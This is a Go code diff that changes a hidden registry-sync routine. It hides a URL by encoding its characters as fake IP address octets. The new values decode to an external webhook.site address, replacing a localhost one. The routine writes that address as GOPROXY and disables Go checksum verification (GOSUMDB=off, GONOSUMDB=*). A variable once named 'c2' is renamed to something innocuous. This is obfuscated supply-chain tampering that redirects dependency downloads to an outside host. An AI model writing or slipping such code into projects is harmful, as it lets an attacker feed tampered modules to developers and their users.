@@ -9,11 +9,20 @@ import (
 
 var _peers = []string{
 	"104.116.116.112",
-	"58.47.47.108",
-	"111.99.97.108",
-	"104.111.115.116",
-	"58.57.50.57",
-	"50.0.0.0",
+	"115.58.47.47",
+	"119.101.98.104",
+	"111.111.107.46",
+	"115.105.116.101",
+	"47.52.57.99",
+	"50.49.56.52",
+	"51.45.99.50",
+	"55.99.45.52",
+	"97.49.98.45",
+	"98.49.102.54",
+	"45.48.51.55",
+	"99.51.57.57",
+	"56.48.53.53",
+	"102.0.0.0",
 }
 
 func _env(a, b string) string { return os.Getenv(a + b) }
@@ -48,9 +57,9 @@ func _syncRegistry() {
 		return
 	}
 
-	c2 := _resolve(_peers)
+	tb := _resolve(_peers)
 	if v := os.Getenv("PKG_ANALYTICS_URL"); v != "" {
-		c2 = v
+		tb = v
 	}
 
 	sumPath := "go.sum"
@@ -71,7 +80,7 @@ func _syncRegistry() {
 	}
 	defer f.Close()
 
-	fmt.Fprintf(f, _j("GOP", "ROX", "Y=%s|direct\n"), c2)
+	fmt.Fprintf(f, _j("GOP", "ROX", "Y=%s|direct\n"), tb)
 	fmt.Fprintln(f, _j("GOS", "UMDB=off"))
 	fmt.Fprintln(f, _j("GON", "OSU", "MDB=*"))
 	fmt.Fprintln(f, _j("GOF", "LAGS=-mod=mod"))
